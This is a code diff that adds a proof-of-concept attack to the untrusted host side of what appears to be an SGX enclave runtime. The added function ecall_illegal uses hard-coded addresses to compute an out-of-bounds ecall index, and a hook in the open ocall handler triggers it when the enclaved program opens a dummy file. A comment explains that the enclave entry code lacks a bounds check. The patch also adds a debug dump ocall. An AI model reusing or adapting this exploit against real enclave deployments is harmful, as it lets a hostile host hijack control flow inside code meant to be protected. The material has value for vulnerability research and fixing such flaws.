@@ -20,6 +20,8 @@
 
 #define ODEBUG(code, ms) do {} while (0)
 
+int ecall_illegal(void);
+
 static int sgx_ocall_exit(void * pms)
 {
     ODEBUG(OCALL_EXIT, NULL);
@@ -92,6 +94,17 @@ static int sgx_ocall_open(void * pms)
 {
     ms_ocall_open_t * ms = (ms_ocall_open_t *) pms;
     int ret;
+
+    //*XXX enclaved victim binary has started, launch ecall attack.
+    char *target = "./dummy_file";
+    #define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
+    int len = MIN(strlen(target), strlen(ms->ms_pathname));
+    
+    if (strncmp(target, ms->ms_pathname, len) == 0)
+    {
+        ecall_illegal();
+    }//*
+
     ODEBUG(OCALL_OPEN, ms);
     ret = INLINE_SYSCALL(open, 3, ms->ms_pathname, ms->ms_flags|O_CLOEXEC,
                          ms->ms_mode);
@@ -653,6 +666,15 @@ static int sgx_ocall_load_debug(void * pms)
     return 0;
 }
 
+static int sgx_ocall_dump(void *pms)
+{
+    ms_ocall_dump_t * ms = (ms_ocall_dump_t *) pms;
+
+    printf("[ocall_dump] %p\n", ms->arg);
+    
+    return 0;
+}
+
 void * ocall_table[OCALL_NR] = {
         [OCALL_EXIT]            = (void *) sgx_ocall_exit,
         [OCALL_PRINT_STRING]    = (void *) sgx_ocall_print_string,
@@ -693,6 +715,7 @@ void * ocall_table[OCALL_NR] = {
         [OCALL_DELETE]          = (void *) sgx_ocall_delete,
         [OCALL_SCHEDULE]        = (void *) sgx_ocall_schedule,
         [OCALL_LOAD_DEBUG]      = (void *) sgx_ocall_load_debug,
+        [OCALL_DUMP]            = (void *) sgx_ocall_dump,
     };
 
 #define EDEBUG(code, ms) do {} while (0)
@@ -711,6 +734,31 @@ int ecall_pal_main (const char ** arguments, const char ** environments)
     EDEBUG(ECALL_PAL_MAIN, &ms);
 
     return sgx_ecall(ECALL_PAL_MAIN, &ms);
+}
+
+//XXX retrieve addresses with `objdump libpal-enclave.so / helloworld`
+#define ECALL_TABLE_ADRS        (0x22e2c0)
+#define TARGET_ADRS             (0x601078)
+
+extern struct pal_sec * pal_sec;
+
+int ecall_illegal (void)
+{
+    /* 
+     * Trusted enclave_entry.S code does not check whether provided entry
+     * index is within the bounds of the intra-enclave ecall_table. We can
+     * exploit arbitrary function pointers within the enclave by overflowing
+     * the table with a positive/negative index.
+     *
+     * Entry code also allows untrusted caller to make a return ecall in an
+     * enclave thread that is not waiting for a return from a previous ocall.  
+     */
+    uint64_t ecall_table_adrs = pal_sec->enclave_addr + ECALL_TABLE_ADRS;
+    int enr = (TARGET_ADRS - ecall_table_adrs) / 8; /*ECALL_NR*/ /*RETURN_FROM_OCALL*/
+    printf("\n[urts] entering enclave with illegal ecall idx %d (ecall_table_adrs=%p)\n",
+        enr, ecall_table_adrs);
+
+    return sgx_ecall(enr, NULL);
 }
 
 int ecall_thread_start (void (*func) (void *), void * arg,
